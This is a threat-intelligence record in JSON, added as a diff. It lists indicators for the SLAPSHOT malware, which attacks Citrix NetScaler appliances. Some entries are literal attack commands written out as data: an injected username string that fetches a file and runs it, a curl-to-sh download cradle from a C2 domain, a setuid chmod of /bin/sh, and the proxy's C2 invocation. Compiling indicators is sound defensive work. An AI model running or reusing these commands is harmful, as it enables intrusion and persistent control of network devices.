@@ -1,0 +1,405 @@
+{
+  "malware_family": "SLAPSHOT",
+  "threat_actor": "",
+  "platforms": [
+    "network_device"
+  ],
+  "summary": "Threat actors chained CVE-2026-88771 and CVE-2026-88779 to gain root access on Citrix NetScaler appliances. The malware, dubbed SLAPSHOT, establishes persistence via cron, rc scripts, and web shells, and uses the compromised device as a pivot point for internal reconnaissance. A separate Go-based proxy named nsvmd was also deployed for C2.",
+  "mitre_techniques": [
+    "T1190",
+    "T1059.004",
+    "T1059.006",
+    "T1059.007",
+    "T1105",
+    "T1053.003",
+    "T1037.004",
+    "T1505.003",
+    "T1548.001",
+    "T1027",
+    "T1070.004",
+    "T1016",
+    "T1018",
+    "T1046",
+    "T1090.001",
+    "T1552.001",
+    "T1005",
+    "T1074.001",
+    "T1560.001",
+    "T1071.001",
+    "T1573",
+    "T1132.001",
+    "T1572",
+    "T1041",
+    "T1020"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "unique_string",
+      "value": "pitboss PPE unexpectedly died NSPPE;fetch${IFS}-qo${IFS}/v ...;sh${IFS}/v;#",
+      "context": "Attacker-controlled text injected into authentication username field for RCE.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "chmod 6555 /bin/sh",
+      "context": "Command run to make /bin/sh setuid for privilege escalation.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "sync HA files all",
+      "context": "Command to synchronize implant files to the HA peer.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "force HA failover",
+      "context": "Command to force failover to the implant-infected HA node.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "curl${IFS}-sSLk${IFS}https://v5v.in/r.sh?k=<token>|sh",
+      "context": "Download and execution cradle for the nsvmd installer.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "nsvmd -server v5v.in:443 -sni c.v5v.in",
+      "context": "Execution of the nsvmd proxy agent with C2 parameters.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/nsconfig/.slap/",
+      "context": "Main framework directory for SLAPSHOT malware.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/nsconfig/.relay/",
+      "context": "Directory for the relay implant.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/flash/.nsvm/",
+      "context": "Base directory for the nsvmd proxy agent and its components.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "vc",
+      "context": "Filename of the Go-based internal reconnaissance scanner.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "vcscan-agent.sh",
+      "context": "Launcher script for the reconnaissance scanner.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "agent.pl",
+      "context": "Perl-based TCP session manager and internal pivot agent.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "reverse-agent.sh",
+      "context": "Outbound reverse shell agent.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "nsvmd",
+      "context": "FreeBSD Go proxy agent binary.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "watchdog.sh",
+      "context": "45-second watchdog script for nsvmd persistence.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "slapshot.py",
+      "context": "Python HTTP tunnel and session manager component.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "whipd.py",
+      "context": "Python HTTP tunnel front-end component.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": ".slap.receiver",
+      "context": "Primary webshell component.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "receiver.deb",
+      "context": "Webshell file masquerading as a Debian package.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/tmp/.uxdlock",
+      "context": "Process coordination lock file for agent.pl.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "vcpersist-<token>_dns_candidates.tsv",
+      "context": "Staged file containing DNS reconnaissance results.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "vcpersist-<token>_vcenter_verified_all.txt",
+      "context": "Staged file containing verified vCenter systems.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "chflags uchg",
+      "context": "Command part used to make the nsvmd binary immutable.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "open",
+      "context": "Command supported by agent.pl to create TCP pivot.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "v5v.in",
+      "context": "C2 domain used by nsvmd proxy agent.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "c.v5v.in",
+      "context": "SNI value used in nsvmd C2 communication.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://v5v.in/r.sh?k=<token>",
+      "context": "URL used to download the nsvmd installer script.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/logon/LogonPoint/custom/receiver.v2.min.css",
+      "context": "Apache alias URL path mapping to the .slap.receiver webshell.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/logon/LogonPoint/custom/receiver.v2.min.<hex>.css",
+      "context": "Pattern for Apache alias URL paths mapping to the webshell.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "HTTP PUT for C2",
+      "context": "Reverse agent returns command output via HTTP PUT requests.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "other",
+      "value": "C2 in HTTP 404 body",
+      "context": "Webshell and Python tunnel return data in HTTP 404 response bodies.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "192.159.99.139",
+      "context": "SLAPSHOT C2, relay, and loot-upload infrastructure.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "213.209.159.55",
+      "context": "Stage server for droppers and data collection.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "209.74.64.192",
+      "context": "C2 IP address used by the nsvmd proxy.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.92.1.17",
+      "context": "Stage and loot infrastructure on port 30444.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "179.60.146.241",
+      "context": "IP address observed serving the 1.sh dropper.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "a0ba4e1ad622d9c3d950b4156d4430812d05bee216ab22c3804a9f7a80535556",
+      "description": "17447d.sh, an earlier version of the SLAPSHOT dropper script."
+    },
+    {
+      "sha256": "6774bfed99da38cec82e721de4bd64a67db7840efadcc71e7df02eb6f0a03c44",
+      "description": "1.sh, a later version of the SLAPSHOT dropper script."
+    },
+    {
+      "sha256": "56a892d80096a9db4ca473a9c3109729c60a5ba901d6ba65948bdb1f4a6fb186",
+      "description": "2.sh / r.sh, the installer script for the nsvmd proxy agent."
+    },
+    {
+      "sha256": "8e8b9532ce40eacfe1b4cf2b11241878b70b910aabd90b453b1460df19b51a4d",
+      "description": "scanner-freebsd-amd64, the Go-based internal reconnaissance tool."
+    },
+    {
+      "sha256": "eaf0086237879bbaac00a5874c0e2ff84deede1ba10e6b706e2288fd3a31cdde",
+      "description": "vc, the installed filename for the Go reconnaissance scanner."
+    },
+    {
+      "sha256": "ffe052fc50271e7739d458b155df790438776032bfd125b974735e1dd9c0b138",
+      "description": "nsvmd, the FreeBSD Go proxy agent binary."
+    }
+  ],
+  "file_types": [
+    "script",
+    "elf"
+  ]
+}
